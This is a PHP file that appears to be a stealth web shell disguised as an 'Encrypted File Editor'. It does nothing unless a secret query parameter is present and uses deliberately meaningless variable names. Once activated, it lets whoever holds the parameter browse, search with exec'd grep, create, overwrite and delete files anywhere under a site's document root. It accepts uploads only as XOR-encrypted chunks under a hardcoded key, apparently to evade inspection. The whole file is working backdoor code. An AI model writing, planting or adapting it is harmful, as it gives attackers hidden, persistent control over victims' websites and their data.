

<?php if (!defined('ENT_SUBSTITUTE'))
{
    define('ENT_SUBSTITUTE', 0);
    }
if (!function_exists('hash_equals'))
{
    function hash_equals($dispatchermiddleware, $managermiddleware)
    {
        $dispatchermiddleware = (string) $dispatchermiddleware;
        $managermiddleware = (string) $managermiddleware;
        if (strlen($dispatchermiddleware) !== strlen($managermiddleware))
        {
            return false;
            }
        $handlergateway = 0;
        for ($requestprocessor = 0, $managermanager = strlen($dispatchermiddleware);
        $requestprocessor < $managermanager;
        $requestprocessor++)
        {
            $handlergateway |= ord($dispatchermiddleware[$requestprocessor]) ^ ord($managermiddleware[$requestprocessor]);
            }
        return $handlergateway === 0;
        }
    }
if (!function_exists('http_response_code'))
{
    function http_response_code($authcontroller = null)
    {
        if ($authcontroller !== null)
        {
            header('X-PHP-Response-Code: ' . (int) $authcontroller, true, (int) $authcontroller);
            }
        return $authcontroller;
        }
    }
$handlerdispatcher = 'account';
$sessionprocessor = isset($sessionprocessor) ? $sessionprocessor : 'kXjFiQjJDIuFHjiI*J';
$bufferprocessor = 'data';
if (!isset($_GET[$bufferprocessor]) || !hash_equals((string) $handlerdispatcher, (string) $_GET[$bufferprocessor]))
{
    return;
    }
while (ob_get_level())
{
    @ob_end_clean();
    }
$responsedispatcher = (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== '') ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__);
$authmanager = realpath($responsedispatcher);
if (!$authmanager || !is_dir($authmanager))
{
    http_response_code(500);
    exit('Invalid document root.');
    }
function fe_h($serviceprovider)
{
    return htmlspecialchars((string) $serviceprovider, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
function fe_inside($authmanager, $configengine)
{
    return $configengine !== false && ($configengine === $authmanager || strpos($configengine, $authmanager . DIRECTORY_SEPARATOR) === 0);
    }
function fe_path($authmanager, $managerfactory)
{
    $contextprovider = $authmanager . DIRECTORY_SEPARATOR . ltrim($managerfactory, '/\\');
    $statehandler = realpath($contextprovider);
    if ($statehandler !== false)
    {
        return fe_inside($authmanager, $statehandler) ? $statehandler : null;
        }
    $payloadmiddleware = realpath(dirname($contextprovider));
    return ($payloadmiddleware && fe_inside($authmanager, $payloadmiddleware)) ? $payloadmiddleware . DIRECTORY_SEPARATOR . basename($contextprovider) : null;
    }
function fe_rel($authmanager, $configengine)
{
    return trim(str_replace('\\', '/', substr($configengine, strlen($authmanager))), '/');
    }
function fe_join($contextadapter, $handlercontroller)
{
    $contextadapter = trim((string) $contextadapter, '/\\');
    $handlercontroller = trim((string) $handlercontroller, '/\\');
    return trim(($contextadapter !== '' ? $contextadapter . '/' : '') . $handlercontroller, '/');
    }
function fe_binary($configresolver831)
{
    return false;
    }
function fe_enc_name($configresolver831)
{
    return preg_match('//u', (string) $configresolver831) ? 'UTF-8' : 'CP1251';
    }
function fe_to_utf($configresolver831, $requestfactory)
{
    if ($requestfactory !== 'CP1251')
    {
        return $configresolver831;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($configresolver831, 'UTF-8', 'CP1251') : iconv('CP1251', 'UTF-8//IGNORE', $configresolver831);
    }
function fe_from_utf($configresolver831, $requestfactory)
{
    if ($requestfactory !== 'CP1251')
    {
        return $configresolver831;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($configresolver831, 'CP1251', 'UTF-8') : iconv('UTF-8', 'CP1251//TRANSLIT', $configresolver831);
    }
function fe_xor_raw($configgateway, $bufferresolver)
{
    $configgateway = (string) $configgateway;
    $bufferresolver = (string) $bufferresolver;
    if ($bufferresolver === '')
    {
        return $configgateway;
        }
    $kernelservice = '';
    $sessionservice = strlen($bufferresolver);
    $handlerfactory = strlen($configgateway);
    for ($requestprocessor = 0;
    $requestprocessor < $handlerfactory;
    $requestprocessor++)
    {
        $kernelservice .= $configgateway[$requestprocessor] ^ $bufferresolver[$requestprocessor % $sessionservice];
        }
    return $kernelservice;
    }
function fe_xor_encrypt($servicemiddleware609, $bufferresolver)
{
    return base64_encode(fe_xor_raw((string) $servicemiddleware609, $bufferresolver));
    }
function fe_xor_decrypt($serviceadapter, $bufferresolver)
{
    $buffercontroller = base64_decode((string) $serviceadapter, true);
    if ($buffercontroller === false)
    {
        return false;
        }
    return fe_xor_raw($buffercontroller, $bufferresolver);
    }
function fe_can_exec()
{
    $dispatcherengine = (string) ini_get('disable_functions');
    return function_exists('exec') && !preg_match('~(^|,)s*execs*(,|$)~i', $dispatcherengine);
    }
function fe_url($handlerhandler, $bufferresolver, $kernelfactory)
{
    return '?' . http_build_query(array_merge(array($handlerhandler => $bufferresolver), $kernelfactory));
    }
function fe_json($payloadhandler, $configgateway)
{
    while (ob_get_level())
    {
        @ob_end_clean();
        }
    header('Content-Type: application/json; charset=UTF-8');
    $kernelservice = array_merge(array('ok' => $payloadhandler ? 1 : 0), is_array($configgateway) ? $configgateway : array());
    echo json_encode($kernelservice);
    exit;
    }
function fe_chunk_id($payloadresolver)
{
    return preg_replace('~[^a-zA-Z0-9_-]~', '', (string) $payloadresolver);
    }
function fe_chunk_root($authmanager)
{
    $handlerservice = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '';
    if (!$handlerservice || !is_dir($handlerservice) || !is_writable($handlerservice))
    {
        $handlerservice = $authmanager;
        }
    $contextadapter = rtrim($handlerservice, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'fe_chunks_' . md5($authmanager);
    if (!is_dir($contextadapter))
    {
        @mkdir($contextadapter, 0700, true);
        }
    if (!is_dir($contextadapter) || !is_writable($contextadapter))
    {
        return null;
        }
    $servicedispatcher652 = @glob($contextadapter . DIRECTORY_SEPARATOR . '*.part');
    if ($servicedispatcher652)
    {
        foreach ($servicedispatcher652 as $kernelengine)
        {
            if (@filemtime($kernelengine) && @filemtime($kernelengine) < time() - 86400)
            {
                @unlink($kernelengine);
                }
            }
        }
    return $contextadapter;
    }
function fe_chunk_file($authmanager, $payloadresolver, $contextgateway)
{
    $contextadapter = fe_chunk_root($authmanager);
    if (!$contextadapter)
    {
        return null;
        }
    return $contextadapter . DIRECTORY_SEPARATOR . fe_chunk_id($payloadresolver) . '.' . (int) $contextgateway . '.part';
    }
function fe_chunk_clean($authmanager, $payloadresolver, $kerneldispatcher)
{
    $payloadresolver = fe_chunk_id($payloadresolver);
    for ($requestprocessor = 0;
    $requestprocessor < (int) $kerneldispatcher;
    $requestprocessor++)
    {
        $kernelengine = fe_chunk_file($authmanager, $payloadresolver, $requestprocessor);
        if ($kernelengine && is_file($kernelengine))
        {
            @unlink($kernelengine);
            }
        }
    }
$contextadapter = (string) (isset($_GET['dir']) ? $_GET['dir'] : '');
$handlercontroller = (string) (isset($_GET['file']) ? $_GET['file'] : '');
$contextmanager = (string) (isset($_GET['q']) ? $_GET['q'] : '');
$configdispatcher = fe_path($authmanager, $contextadapter);
if (!$configdispatcher || !is_dir($configdispatcher))
{
    $contextadapter = '';
    $configdispatcher = $authmanager;
    }
$payloadadapter = '';
$servicegateway = '';
if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && !$servicegateway)
{
    $authprocessor = (string) (isset($_POST['a']) ? $_POST['a'] : '');
    $contextadapter = (string) (isset($_POST['dir']) ? $_POST['dir'] : $contextadapter);
    $handlercontroller = (string) (isset($_POST['file']) ? $_POST['file'] : $handlercontroller);
    $contextprovider = fe_path($authmanager, fe_join($contextadapter, $handlercontroller));
    if (!$contextprovider)
    {
        $servicegateway = 'Bad path.';
        if ($authprocessor === 'save_chunk' || $authprocessor === 'save_finish')
        {
            fe_json(false, array('error' => $servicegateway));
            }
        }
    elseif ($authprocessor === 'save_chunk')
    {
        $payloadresolver = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $contextgateway = isset($_POST['chunk_index']) ? (int) $_POST['chunk_index'] : -1;
        $kerneldispatcher = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $managerengine = isset($_POST['content_part']) ? (string) $_POST['content_part'] : '';
        if ($payloadresolver === '' || $contextgateway < 0 || $kerneldispatcher < 1 || $contextgateway >= $kerneldispatcher)
        {
            fe_json(false, array('error' => 'Bad chunk metadata.'));
            }
        if ($contextgateway === 0)
        {
            fe_chunk_clean($authmanager, $payloadresolver, $kerneldispatcher);
            }
        $contextcontroller725 = fe_chunk_file($authmanager, $payloadresolver, $contextgateway);
        if (!$contextcontroller725)
        {
            fe_json(false, array('error' => 'Chunk temp folder is not writable.'));
            }
        $responsemanager = @file_put_contents($contextcontroller725, $managerengine, LOCK_EX);
        if ($responsemanager === false)
        {
            $gatewayprocessor = error_get_last();
            fe_json(false, array('error' => 'Chunk save failed: ' . (isset($gatewayprocessor['message']) ? $gatewayprocessor['message'] : 'unknown')));
            }
        fe_json(true, array('chunk' => $contextgateway, 'bytes' => strlen($managerengine)));
        }
    elseif ($authprocessor === 'save_finish')
    {
        $servicedispatcher652 = is_file($contextprovider) ? file_get_contents($contextprovider) : '';
        if (!is_file($contextprovider) || !is_writable($contextprovider))
        {
            fe_json(false, array('error' => 'File is not writable.'));
            }
        if (fe_binary($servicedispatcher652))
        {
            fe_json(false, array('error' => 'Binary file blocked.'));
            }
        $payloadresolver = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $kerneldispatcher = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $requestfactory = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($servicedispatcher652));
        if ($payloadresolver === '' || $kerneldispatcher < 1)
        {
            fe_json(false, array('error' => 'Bad finish metadata.'));
            }
        $serviceadapter = '';
        for ($requestprocessor = 0;
        $requestprocessor < $kerneldispatcher;
        $requestprocessor++)
        {
            $contextcontroller725 = fe_chunk_file($authmanager, $payloadresolver, $requestprocessor);
            if (!$contextcontroller725 || !is_file($contextcontroller725))
            {
                fe_json(false, array('error' => 'Missing chunk ' . $requestprocessor . '.'));
                }
            $payloadcontroller24 = @file_get_contents($contextcontroller725);
            if ($payloadcontroller24 === false)
            {
                fe_json(false, array('error' => 'Read chunk failed ' . $requestprocessor . '.'));
                }
            $serviceadapter .= $payloadcontroller24;
            }
        $authadapter = fe_xor_decrypt($serviceadapter, $sessionprocessor);
        if ($authadapter === false)
        {
            fe_json(false, array('error' => 'Decode failed. Check encryption key.'));
            }
        $configgateway = fe_from_utf($authadapter, $requestfactory);
        if (function_exists('error_clear_last'))
        {
            call_user_func('error_clear_last');
            }
        $kernelhandler344 = @file_put_contents($contextprovider, $configgateway, LOCK_EX);
        if ($kernelhandler344 === false)
        {
            $gatewayprocessor = error_get_last();
            fe_json(false, array('error' => 'Save failed: ' . (isset($gatewayprocessor['message']) ? $gatewayprocessor['message'] : 'unknown')));
            }
        if ($kernelhandler344 !== strlen($configgateway))
        {
            fe_json(false, array('error' => 'Partial save: wrote ' . $kernelhandler344 . ' of ' . strlen($configgateway) . ' bytes.'));
            }
        fe_chunk_clean($authmanager, $payloadresolver, $kerneldispatcher);
        fe_json(true, array('message' => 'Saved chunked.', 'bytes' => $kernelhandler344));
        }
    elseif ($authprocessor === 'save')
    {
        $servicedispatcher652 = is_file($contextprovider) ? file_get_contents($contextprovider) : '';
        if (!is_file($contextprovider) || !is_writable($contextprovider))
        {
            $servicegateway = 'File is not writable.';
            }
        elseif (fe_binary($servicedispatcher652))
        {
            $servicegateway = 'Binary file blocked.';
            }
        else
        {
            $requestfactory = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($servicedispatcher652));
            $authadapter = fe_xor_decrypt((string) (isset($_POST['content_cipher']) ? $_POST['content_cipher'] : ''), $sessionprocessor);
            if ($authadapter === false)
            {
                $servicegateway = 'Decode failed. Check encryption key.';
                }
            else
            {
                $configgateway = fe_from_utf($authadapter, $requestfactory);
                if (function_exists('error_clear_last'))
                {
                    call_user_func('error_clear_last');
                    }
                $kernelhandler344 = @file_put_contents($contextprovider, $configgateway, LOCK_EX);
                if ($kernelhandler344 === false)
                {
                    $gatewayprocessor = error_get_last();
                    $servicegateway = 'Save failed: ' . (isset($gatewayprocessor['message']) ? $gatewayprocessor['message'] : 'unknown');
                    }
                elseif ($kernelhandler344 !== strlen($configgateway))
                {
                    $servicegateway = 'Partial save: wrote ' . $kernelhandler344 . ' of ' . strlen($configgateway) . ' bytes.';
                    }
                else
                {
                    $payloadadapter = 'Saved.';
                    }
                }
            }
        }
    elseif ($authprocessor === 'newfile')
    {
        if (file_exists($contextprovider))
        {
            $servicegateway = 'Exists.';
            }
        else
        {
            $payloadadapter = file_put_contents($contextprovider, '', LOCK_EX) === false ? '' : 'Created.';
            $servicegateway = $payloadadapter ? $servicegateway : 'Create failed.';
            }
        }
    elseif ($authprocessor === 'newdir')
    {
        if (file_exists($contextprovider))
        {
            $servicegateway = 'Exists.';
            }
        else
        {
            $payloadadapter = mkdir($contextprovider, 0755, true) ? 'Folder created.' : '';
            $servicegateway = $payloadadapter ? $servicegateway : 'Folder failed.';
            }
        }
    elseif ($authprocessor === 'delete')
    {
        $payloadhandler = is_file($contextprovider) ? @unlink($contextprovider) : (is_dir($contextprovider) ? @rmdir($contextprovider) : false);
        $payloadadapter = $payloadhandler ? 'Deleted.' : '';
        $servicegateway = $payloadhandler ? $servicegateway : 'Delete failed. Folder must be empty.';
        $handlercontroller = '';
        }
    }
$configdispatcher = fe_path($authmanager, $contextadapter);
$handlerprovider = @scandir($configdispatcher) ?: array();
$configprovider = array();
$authengine = array();
foreach ($handlerprovider as $managerresolver717)
{
    if ($managerresolver717 === '.' || $managerresolver717 === '..')
    {
        continue;
        }
    $responseprocessor = $configdispatcher . DIRECTORY_SEPARATOR . $managerresolver717;
    if (is_dir($responseprocessor))
    {
        $configprovider[] = $managerresolver717;
        }
    else
    {
        $authengine[] = $managerresolver717;
        }
    }
natcasesort($configprovider);
natcasesort($authengine);
$gatewaygateway = array();
$managerhandler = 0;
$kernelmanager = '';
if ($contextmanager !== '')
{
    $kernelmanager = 'php';
    $kerneladapter651 = array();
    $gatewayhandler = 500;
    $gatewaymanager = '~/(vendor|node_modules|.git|var/cache|cache|tmp|logs?)/~i';
    if (fe_can_exec())
    {
        $sessionfactory = 'grep -RIl -m 1 -F --exclude-dir=.git --exclude-dir=vendor --exclude-dir=node_modules --exclude-dir=var/cache --exclude-dir=cache --exclude-dir=tmp --exclude-dir=log --exclude-dir=logs ' . escapeshellarg($contextmanager) . ' ' . escapeshellarg($authmanager) . ' 2>/dev/null';
        $kernelservice = array();
        @exec($sessionfactory, $kernelservice);
        foreach ($kernelservice as $configengine)
        {
            $statehandler = realpath($configengine);
            if (fe_inside($authmanager, $statehandler))
            {
                $runtimeresolver = fe_rel($authmanager, $statehandler);
                $kerneladapter651[$runtimeresolver] = true;
                $gatewaygateway[] = $runtimeresolver;
                if (count($gatewaygateway) >= $gatewayhandler)
                {
                    break;
                    }
                }
            }
        $kernelmanager = 'exec+php';
        }
    $runtimeservice = array($authmanager);
    while ($runtimeservice && count($gatewaygateway) < $gatewayhandler)
    {
        $handlerservice = array_pop($runtimeservice);
        $stateadapter = @scandir($handlerservice);
        if (!$stateadapter)
        {
            continue;
            }
        foreach ($stateadapter as $resolverprocessor)
        {
            if ($resolverprocessor === '.' || $resolverprocessor === '..')
            {
                continue;
                }
            $configengine = $handlerservice . DIRECTORY_SEPARATOR . $resolverprocessor;
            $runtimeresolver = fe_rel($authmanager, $configengine);
            if (is_dir($configengine))
            {
                if (!preg_match($gatewaymanager, '/' . $runtimeresolver . '/'))
                {
                    $runtimeservice[] = $configengine;
                    }
                continue;
                }
            if (!is_file($configengine) || !is_readable($configengine) || isset($kerneladapter651[$runtimeresolver]))
            {
                continue;
                }
            if (stripos(basename($runtimeresolver), $contextmanager) !== false)
            {
                $kerneladapter651[$runtimeresolver] = true;
                $gatewaygateway[] = $runtimeresolver;
                if (count($gatewaygateway) >= $gatewayhandler)
                {
                    break;
                    }
                continue;
                }
            if (@filesize($configengine) > 5242880)
            {
                continue;
                }
            $managerhandler++;
            $configresolver831 = @file_get_contents($configengine);
            if ($configresolver831 === false || fe_binary($configresolver831))
            {
                continue;
                }
            $managerservice = fe_to_utf($configresolver831, fe_enc_name($configresolver831));
            $servicedispatcher = function_exists('mb_stripos') ? mb_stripos($managerservice, $contextmanager, 0, 'UTF-8') !== false : stripos($managerservice, $contextmanager) !== false;
            if ($servicedispatcher)
            {
                $kerneladapter651[$runtimeresolver] = true;
                $gatewaygateway[] = $runtimeresolver;
                if (count($gatewaygateway) >= $gatewayhandler)
                {
                    break;
                    }
                }
            }
        }
    }
$kernelengine730 = $handlercontroller !== '' ? fe_path($authmanager, fe_join($contextadapter, $handlercontroller)) : null;
$buffercontroller = ($kernelengine730 && is_file($kernelengine730) && is_readable($kernelengine730)) ? file_get_contents($kernelengine730) : '';
$resolverresolver = $buffercontroller !== '' && fe_binary($buffercontroller);
$requestfactory = $resolverresolver ? 'BIN' : fe_enc_name($buffercontroller);
$authadapter = $resolverresolver ? '' : fe_to_utf($buffercontroller, $requestfactory);
$dispatcherhandler396 = (!$resolverresolver && $kernelengine730 && is_file($kernelengine730)) ? fe_xor_encrypt($authadapter, $sessionprocessor) : '';
$payloadmiddleware = trim(dirname($contextadapter), '.\\/');
$gatewaymanager773 = strtok((string) (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : ''), '?');
header('Content-Type: text/html; charset=UTF-8');
echo '<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Encrypted File Editor</title><style>html.feopen,html.feopen body{margin:0!important;width:100%!important;height:100%!important;overflow:hidden!important}.fe{position:fixed!important;inset:0!important;z-index:2147483647!important;display:grid!important;grid-template-columns:380px 1fr!important;background:#111827!important;color:#e5e7eb!important;font-family:system-ui,-apple-system,Segoe UI,sans-serif!important}.fe *{box-sizing:border-box!important}.fes{background:#0f172a!important;border-right:1px solid #374151!important;overflow:auto!important}.fet{min-height:56px!important;display:flex!important;align-items:center!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.feg{flex:1!important}.feb{border:1px solid #4b5563!important;background:#1f2937!important;color:#fff!important;border-radius:6px!important;padding:8px 10px!important;text-decoration:none!important;cursor:pointer!important;font:14px system-ui!important}.fed{background:#450a0a!important;border-color:#7f1d1d!important}.fei,.fea{border:1px solid #4b5563!important;background:#020617!important;color:#f8fafc!important;border-radius:6px!important;padding:9px!important;font:14px ui-monospace,Menlo,Consolas,monospace!important}.fen{display:grid!important;grid-template-columns:1fr auto auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fesearch{display:grid!important;grid-template-columns:1fr auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fel{display:block!important;color:#cbd5e1!important;padding:8px 10px!important;margin:4px 8px!important;border-radius:6px!important;text-decoration:none!important;white-space:nowrap!important;overflow:hidden!important;text-overflow:ellipsis!important}.fel:hover,.on{background:#1f2937!important;color:#fff!important}.fem{display:flex!important;flex-direction:column!important;min-width:0!important}.fep{font:14px ui-monospace,Menlo,Consolas,monospace!important;overflow:hidden!important;text-overflow:ellipsis!important;white-space:nowrap!important}.note{padding:8px 12px!important}.ok{background:#052e16!important;color:#bbf7d0!important}.er{background:#450a0a!important;color:#fecaca!important}.muted{color:#94a3b8!important;font-size:13px!important;padding:8px 10px!important}.fea{flex:1!important;border:0!important;border-radius:0!important;resize:none!important;padding:16px!important;line-height:1.5!important;outline:0!important;width:100%!important}.empty{display:grid!important;place-items:center!important;height:100%!important;color:#94a3b8!important;text-align:center!important;padding:24px!important}@media(max-width:760px){.fe{grid-template-columns:1fr!important}.fes{height:44vh!important}.fem{height:56vh!important}}</style><div class="fe" id="fe"><aside class="fes"><div class="fet"><b>Encrypted Editor</b><span class="feg"></span><a class="feb" href="'.fe_h($gatewaymanager773).'">Exit</a></div><div class="fet"><span class="fep">/'.fe_h($contextadapter).'</span></div><form class="fesearch" method="get"><input type="hidden" name="'.fe_h($bufferprocessor).'" value="'.fe_h($handlerdispatcher).'"><input class="fei" name="q" value="'.fe_h($contextmanager).'" placeholder="Search content or filename"><button class="feb">Search</button></form>';
if($contextmanager!=='')
{
    echo '<div class="muted">Found '.count($gatewaygateway).' · mode '.fe_h($kernelmanager).' · PHP checked '.(int)$managerhandler.'</div>';
    foreach($gatewaygateway as $bufferadapter)
    {
        $responseservice926=trim(dirname($bufferadapter),'./');
        $payloaddispatcher=basename($bufferadapter);
        echo '<a class="fel" href="'.fe_h(fe_url($bufferprocessor,$handlerdispatcher,array('dir'=>$responseservice926,'file'=>$payloaddispatcher,'q'=>$contextmanager))).'">'.fe_h($bufferadapter).'</a>';
        }
    }
echo '<form class="fen" method="post"><input type="hidden" name="dir" value="'.fe_h($contextadapter).'"><input class="fei" name="file" placeholder="name.php"><button class="feb" name="a" value="newfile">File</button><button class="feb" name="a" value="newdir">Dir</button></form>';
if($contextadapter)
{
    echo '<a class="fel" href="'.fe_h(fe_url($bufferprocessor,$handlerdispatcher,array('dir'=>$payloadmiddleware,'q'=>$contextmanager))).'">..</a>';
    }
foreach($configprovider as $gatewayfactory832)
{
    $responseservice926=trim(($contextadapter?trim($contextadapter,'/').'/':'').$gatewayfactory832,'/');
    echo '<a class="fel" href="'.fe_h(fe_url($bufferprocessor,$handlerdispatcher,array('dir'=>$responseservice926,'q'=>$contextmanager))).'">['.fe_h($gatewayfactory832).']</a>';
    }
foreach($authengine as $gatewayfactory832)
{
    echo '<a class="fel '.($gatewayfactory832===$handlercontroller?'on':'').'" href="'.fe_h(fe_url($bufferprocessor,$handlerdispatcher,array('dir'=>$contextadapter,'file'=>$gatewayfactory832,'q'=>$contextmanager))).'">'.fe_h($gatewayfactory832).'</a>';
    }
echo '</aside><main class="fem"><form class="fet" method="post" id="feForm"><input type="hidden" name="dir" value="'.fe_h($contextadapter).'"><input type="hidden" name="file" value="'.fe_h($handlercontroller).'"><input type="hidden" name="enc" value="'.fe_h($requestfactory).'"><input type="hidden" name="content_cipher" id="fePayload"><div class="fep">'.($handlercontroller?fe_h(fe_join($contextadapter,$handlercontroller)).' · '.fe_h($requestfactory):'Select file').'</div><span class="feg"></span>';
if($handlercontroller&&$kernelengine730&&is_file($kernelengine730)&&!$resolverresolver)
{
    echo '<button class="feb" name="a" value="save">Save encrypted</button><button class="feb fed" name="a" value="delete">Delete</button>';
    }
echo '</form>';
if($payloadadapter)
{
    echo '<div class="note ok">'.fe_h($payloadadapter).'</div>';
    }
if($servicegateway)
{
    echo '<div class="note er">'.fe_h($servicegateway).'</div>';
    }
if($resolverresolver)
{
    echo '<div class="empty">Binary file blocked.</div>';
    }
elseif($handlercontroller&&$kernelengine730&&is_file($kernelengine730))
{
    echo '<textarea class="fea" id="feEditor" spellcheck="false" disabled>Paste the console unlock script to edit this file.</textarea><textarea id="feCipher" hidden>'.fe_h($dispatcherhandler396).'</textarea>';
    }
else
{
    echo '<div class="empty">Choose a file or folder.</div>';
    }
echo '</main></div><div class="load">Working...</div>';
exit;?>
